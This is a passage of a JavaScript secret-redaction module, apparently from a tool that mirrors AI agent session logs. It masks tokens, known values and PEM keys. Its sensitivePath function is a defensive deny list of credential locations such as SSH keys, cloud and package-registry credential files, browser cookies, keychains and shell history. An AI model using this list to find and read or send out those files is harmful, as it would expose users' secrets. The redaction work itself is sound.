  return -1;
}

// One pass of one regex over `text` from `from`: mask each match's group unless
// it is empty, already a mark, or guarded. Masks are noted, not reported:
// onMask runs only after every rule has finished, so a callback can never
// re-enter a scan in progress.
function scan(text, entry, spec, from, notes) {
  const { re, group, guard } = spec;
  const { row, note } = entry;
  re.lastIndex = from;
  let out = '';
  let last = 0;
  let changed = false;
  let m;
  while ((m = re.exec(text)) !== null) {
    if (m[0] === '') { re.lastIndex++; continue; }
    const g = pickGroup(m, group);
    if (g < 0) continue;
    const [s, e] = m.indices[g];
    if (e <= s) continue;
    const value = text.slice(s, e);
    if (isMasked(value) || insideMark(text, s)) continue;
    const before = s > 0 ? text[s - 1] : '';
    const info = {
      g, m, label: row.label, guard,
      key: row.key ? m[row.key] || '' : '',
      quoted: before === '"' || before === "'",
      note: () => notes.push(note),
    };
    let rep;
    if (row.mask) {
      rep = row.mask(value, info);
    } else {
      if (guard && guard(value, info)) continue;
      rep = MASK(row.label);
      notes.push(note);
    }
    if (rep === value) continue;
    out += text.slice(last, s) + rep;
    last = e;
    changed = true;
  }
  return changed ? out + text.slice(last) : text;
}

const escapeRegExp = (s) => s.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
const COMPILED = Symbol('redact.known');

// The registered values, compiled once: a case-insensitive alternation (longest
// first) of each value and its URL-encoded spelling, plus the tail check (a
// value cut at the end of the text, 8 characters or more of it). The result
// holds the values in a closure only: it serialises to `{}`.
function compileKnown(known) {
  if (!known) return null;
  if (known[COMPILED]) return known;
  const pairs = [];
  const add = (v, l) => { if (typeof v === 'string' && v.length >= KNOWN_MIN) pairs.push([v, l]); };
  if (known instanceof Map) for (const [v, l] of known) add(v, l);
  else if (Array.isArray(known)) {
    for (const k of known) {
      if (typeof k === 'string') add(k);
      else if (Array.isArray(k)) add(k[0], k[1]);
      else if (k && typeof k === 'object') add(k.value, k.label);
    }
  }
  if (!pairs.length) return null;
  const labels = new Map();
  for (const [v, l] of pairs) {
    const spellings = [v];
    try { const enc = encodeURIComponent(v); if (enc !== v) spellings.push(enc); } catch { /* a lone surrogate */ }
    for (const sp of spellings) {
      const k = sp.toLowerCase();
      if (!labels.has(k)) labels.set(k, l || 'known');
    }
  }
  const keys = [...labels.keys()].sort((a, b) => b.length - a.length);
  const re = new RegExp(keys.map(escapeRegExp).join('|'), 'gi');
  const note = (label) => Object.freeze({ id: 'known', label: MASK(label).slice(MASK_OPEN.length, -MARK_CLOSE.length), tier: 1 });
  function redact(text, notes) {
    let t = text.replace(re, (hit, offset, whole) => {
      if (insideMark(whole, offset)) return hit;
      const label = labels.get(hit.toLowerCase()) || 'known';
      notes.push(note(label));
      return MASK(label);
    });
    let end = t.length;
    while (end > 0 && /[\s.…]/.test(t[end - 1])) end--;
    const tailText = t.slice(Math.max(0, end - keys[0].length), end).toLowerCase();
    for (const k of keys) {
      for (let n = Math.min(k.length - 1, tailText.length); n >= KNOWN_MIN; n--) {
        if (!tailText.endsWith(k.slice(0, n)) || insideMark(t, end - n)) continue;
        const label = labels.get(k);
        notes.push(note(label));
        return t.slice(0, end - n) + MASK(label) + t.slice(end);
      }
    }
    return t;
  }
  return Object.freeze({ [COMPILED]: true, redact });
}

function prepare(opts) {
  const o = opts || {};
  return {
    known: compileKnown(o.known),
    mode: o.context && typeof o.context.mode === 'string' ? o.context.mode : null,
    onMask: typeof o.onMask === 'function' ? o.onMask : null,
  };
}

function run(text, prep) {
  if (typeof text !== 'string' || text.length < MIN_TEXT) return text;
  const lower = text.toLowerCase();
  const notes = [];
  let t = text;
  for (const entry of ENGINE) {
    const { row } = entry;
    if (row.id === 'known') {
      if (prep.known) t = prep.known.redact(t, notes);
      continue;
    }
    if (!entry.full) continue;
    if (row.mode && row.mode !== prep.mode) continue;
    if (row.pre.length && !row.pre.some((p) => lower.includes(p))) continue;
    t = scan(t, entry, entry.full, 0, notes);
    if (entry.tail) t = scan(t, entry, entry.tail, Math.max(0, t.length - TAIL_SPAN), notes);
  }
  if (prep.onMask) for (const n of notes) prep.onMask(n);
  return t;
}

// ── the API ─────────────────────────────────────────────────────────────────

// redactText(text, { context, known, onMask }) → the text with every secret
// masked. A non-string is returned as it came. onMask({ id, label, tier }) runs
// once per mask, after the text is done; it never sees a value.
function redactText(text, opts) {
  return run(text, prepare(opts));
}

// redactValue(value, opts) → a deep copy: every string through redactText,
// every key too (a secret used as a key is still a secret), and the string
// values of credential-named keys masked whole (json-key). Plain objects and
// arrays are copied (shared references and cycles preserved); anything else
// (a Date, a Buffer, a class instance) is returned as it is.
function redactValue(value, opts) {
  const prep = prepare(opts);
  const jsonKey = ROW_OF.get('json-key');
  const seen = new Map();
  const walk = (v, sensitive) => {
    if (typeof v === 'string') {
      if (sensitive && v && !isMasked(v)) {
        if (prep.onMask) prep.onMask(NOTE_OF.get('json-key'));
        return MASK(jsonKey.label);
      }
      return run(v, prep);
    }
    if (!v || typeof v !== 'object') return v;
    if (seen.has(v)) return seen.get(v);
    if (Array.isArray(v)) {
      const out = [];
      seen.set(v, out);
      for (const x of v) out.push(walk(x, sensitive));
      return out;
    }
    const proto = Object.getPrototypeOf(v);
    if (proto !== Object.prototype && proto !== null) return v;
    const out = {};
    seen.set(v, out);
    for (const k of Object.keys(v)) {
      // defineProperty, not assignment: a "__proto__" key from JSON.parse stays
      // an own property instead of replacing the copy's prototype.
      Object.defineProperty(out, run(k, prep), { value: walk(v[k], sensitiveKey(k)), enumerable: true, writable: true, configurable: true });
    }
    return out;
  };
  return walk(value, false);
}

// An END marker with no BEGIN before it: the window opened inside a key.
const PEM_BEGIN_RE = new RegExp(PEM_BEGIN);
const PEM_END_RE = new RegExp(PEM_END);
function maskOrphanEnd(text, notes) {
  const m = PEM_END_RE.exec(text);
  if (!m || PEM_BEGIN_RE.test(text.slice(0, m.index))) return text;
  notes.push(NOTE_OF.get('pem'));
  return MASK(ROW_OF.get('pem').label) + text.slice(m.index + m[0].length);
}

// A window's leading partial line longer than this becomes PARTIAL_LINE.
const WINDOW_LINE_MAX = 4096;

// redactWindow(text, { startsMidFile, complete, context, known, onMask }) → a
// bounded read (lib/core/claude-files readWindow: a task's tail, a tool-results
// file) made safe to show. Its cut edges may hold a fragment no rule can
// recognise, so: a window that opens mid-file drops everything up to its first
// newline (or, when its first 4 KB hold none, shows PARTIAL_LINE in its place);
// an incomplete one (`complete: false`) drops its unterminated last line; an END
// marker with no BEGIN masks everything from the window's start; the rest is
// redactText. Callers redact a window through here BEFORE truncating it further
// for display, never after. A window with nothing left to show is PARTIAL_LINE.
function redactWindow(text, opts) {
  if (typeof text !== 'string' || !text) return text;
  const o = opts || {};
  let t = text;
  let lead = '';
  if (o.startsMidFile) {
    const nl = t.indexOf('\n');
    if (nl >= 0 && nl < WINDOW_LINE_MAX) t = t.slice(nl + 1);
    else { lead = PARTIAL_LINE; t = nl >= 0 ? t.slice(nl) : ''; }
  }
  if (o.complete === false) {
    const nl = t.lastIndexOf('\n');
    t = nl >= 0 ? t.slice(0, nl + 1) : '';
  }
  const prep = prepare(o);
  const notes = [];
  t = maskOrphanEnd(t, notes);
  if (prep.onMask) for (const n of notes) prep.onMask(n);
  const out = lead + run(t, prep);
  return out || !text ? out : PARTIAL_LINE;
}

// ── sensitive paths ─────────────────────────────────────────────────────────

const PATH_CATEGORIES = Object.freeze(['dotenv', 'ssh', 'key', 'cloud', 'pkg', 'claude', 'web-chat', 'history', 'credentials', 'browser', 'git']);
// What the mirror withholds whole. `web-chat` and `git` are shown (their
// secrets are caught by json-key and url-creds), and both stay on the `@`
// refusal list, which is every category.
const WITHHOLD_CATEGORIES = Object.freeze(PATH_CATEGORIES.filter((c) => c !== 'web-chat' && c !== 'git'));

const PKG_FILES = new Set(['.npmrc', '.pypirc', '.netrc', '.git-credentials', '.yarnrc', '.yarnrc.yml']);
// Source code and its documentation: a `secrets.js` is code about secrets.
const SOURCE_FILE = /\.(?:[cm]?[jt]sx?|py|rb|go|rs|java|kts?|swift|c|cc|cpp|h|hpp|cs|php|scala|lua|pl|sh|bash|zsh|fish|vue|svelte|md|mdx|rst)$/;

function isDotenv(base) {
  const env = base === '.env' || base.startsWith('.env.') || base.endsWith('.env') || base === '.envrc' || base === '.dev.vars';
  return env && !/\.(?:example|sample|template|dist|defaults?)$/.test(base);
}

// sensitivePath(p) → null or the category of a path the mirror withholds, or
// the `@` input refuses (§6.2). Every pattern matches case-insensitively on
// every platform (APFS and NTFS are case-insensitive, so `.ENV`, `ID_RSA` and
// `Credentials.json` name the same files, and over-withholding a Linux `.ENV`
// costs nothing), with `/` or `\` separators. The withheld categories are
// checked before `web-chat` and `git`, so a key file inside `.git/` is a key.
function sensitivePath(p) {
  if (typeof p !== 'string' || !p) return null;
  const segs = p.toLowerCase().split(/[\\/]+/).filter(Boolean);
  if (!segs.length) return null;
  const base = segs[segs.length - 1];
  const has = (s) => segs.includes(s);
  const pair = (a, b) => segs.some((s, i) => s === a && segs[i + 1] === b);

  if (isDotenv(base)) return 'dotenv';
  if (has('.ssh') || /^id_(?:rsa|ed25519|ecdsa|dsa)/.test(base) || base === 'authorized_keys' || base === 'known_hosts') return 'ssh';
  if (/\.(?:pem|key|p12|pfx|p8|jks|keystore|ppk)$/.test(base)) return 'key';
  if (pair('.aws', 'credentials') || pair('.aws', 'config') || pair('.config', 'gcloud')
    || base === 'application_default_credentials.json' || /^service[-_]?account.*\.json$/.test(base)
    || pair('.kube', 'config') || pair('.docker', 'config.json') || has('.azure')) return 'cloud';
  if (PKG_FILES.has(base) || pair('.gem', 'credentials') || pair('.cargo', 'credentials') || pair('.cargo', 'credentials.toml')) return 'pkg';
  if (pair('.claude', '.credentials.json') || base === '.claude.json' || pair('.claude', 'settings.local.json') || pair('.claude', 'sessions')) return 'claude';
  if (/_history$/.test(base)) return 'history';
  if ((/(?:^|[-_.])(?:credentials?|secrets?)(?:[-_.]|$)/.test(base) && !SOURCE_FILE.test(base)) || /\.secret$/.test(base)) return 'credentials';
  if (base === 'cookies' || base === 'cookies.sqlite' || /\.binarycookies$/.test(base) || pair('library', 'keychains')) return 'browser';
  if (has('.web-chat')) return 'web-chat';
  if (has('.git')) return 'git';
  return null;
}

// ── never emitted ───────────────────────────────────────────────────────────

// What the mirror engine drops rather than redacts (spec §5.5, D7): harness
// payloads (the system prompt, the account email, the organisation id, the
// rules files) and the duplicate copies of values it already shows once.
// `structuredPatch` is kept and redacted per hunk with its path as context.
const NEVER_EMIT = Object.freeze({
  kinds: Object.freeze([
    'attachment/prompt_snapshot',
    'attachment/session_context',
    'attachment/credential_org',
    'attachment/instructions',
  ]),
  fields: Object.freeze([
    'wireToolInputs',
    'attachment.rendered',
    'thinking.signature',
    'queue-operation.content',
    'toolUseResult.stdout',
    'toolUseResult.stderr',
    'toolUseResult.file.content',
    'toolUseResult.originalFile',
  ]),
});

// ── the redactor (ctx.redactor) ─────────────────────────────────────────────

// createRedactor() → { addKnown(value, label), text, value, window }: the three
// redactions with this redactor's known values applied, plus any a call passes.
// addKnown registers a value of 8 characters or more under a label (`email`,
// `org`, …) and answers whether it did. The values stay in this closure.
function createRedactor() {
  const values = new Map();
  let compiled = null;
  const knownFor = (opts) => {
    if (opts && opts.known) return compileKnown([...values.entries(), ...asPairs(opts.known)]);
    if (!compiled && values.size) compiled = compileKnown(values);
    return compiled;
  };
  const withKnown = (opts) => ({ ...(opts || {}), known: knownFor(opts) });
  return Object.freeze({
    addKnown(value, label) {
      if (typeof value !== 'string' || value.length < KNOWN_MIN) return false;
      values.set(value, label || 'known');
      compiled = null;
      return true;
    },
    text: (s, opts) => redactText(s, withKnown(opts)),
    value: (v, opts) => redactValue(v, withKnown(opts)),
    window: (t, opts) => redactWindow(t, withKnown(opts)),
  });
}

// A caller's `known` option as [value, label] pairs.
function asPairs(known) {
  if (known instanceof Map) return [...known.entries()];
  if (!Array.isArray(known)) return [];
  return known.map((k) => (typeof k === 'string' ? [k, 'known'] : Array.isArray(k) ? [k[0], k[1]] : [k && k.value, k && k.label]));
}

module.exports = {
  MASK,
  WITHHELD,
  PARTIAL_LINE,
  RULES,
  NEVER_EMIT,
  PATH_CATEGORIES,
  WITHHOLD_CATEGORIES,
  redactText,
  redactValue,
  redactWindow,
  sensitivePath,
  sensitiveKey,
  createRedactor,
};
